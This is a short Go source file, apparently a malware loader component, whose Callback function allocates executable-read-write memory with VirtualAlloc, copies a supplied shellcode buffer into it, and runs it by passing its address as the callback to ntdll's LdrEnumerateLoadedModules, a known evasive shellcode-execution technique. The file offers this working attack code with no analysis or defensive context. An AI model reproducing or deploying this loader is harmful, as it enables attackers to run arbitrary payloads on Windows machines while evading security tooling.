package TT

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
	hNtdll1    uintptr
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	ntdll            = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
	GetModuleHandleW = kernel32.MustFindProc("GetModuleHandleW")
	GetProcAddress   = kernel32.MustFindProc("GetProcAddress")
	LoadLibraryA     = kernel32.MustFindProc("LoadLibraryA")
	RtlMoveMemory    = ntdll.MustFindProc("RtlMoveMemory")
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type LDR_DATA_TABLE_ENTRY struct {
	InLoadOrderLinks           LIST_ENTRY
	InMemoryOrderLinks         LIST_ENTRY
	InInitializationOrderLinks LIST_ENTRY
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	FullDllName                UNICODE_STRING
	BaseDllName                UNICODE_STRING
	Flags                      uint32
	LoadCount                  uint16
	TlsIndex                   uint16
	HashLinks                  LIST_ENTRY
	TimeDateStamp              uint32
}

type LIST_ENTRY struct {
	Flink *LIST_ENTRY
	Blink *LIST_ENTRY
}

type LDR_ENUM_CALLBACK func(ModuleInformation *LDR_DATA_TABLE_ENTRY, Parameter int16, Stop int16) uintptr

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	hNtdll, _ := syscall.LoadLibrary("ntdll")
	LdrEnumerateLoadedModules, _ := syscall.GetProcAddress(hNtdll, "LdrEnumerateLoadedModules")
	syscall.SyscallN(LdrEnumerateLoadedModules, NULL, addr, NULL)
}
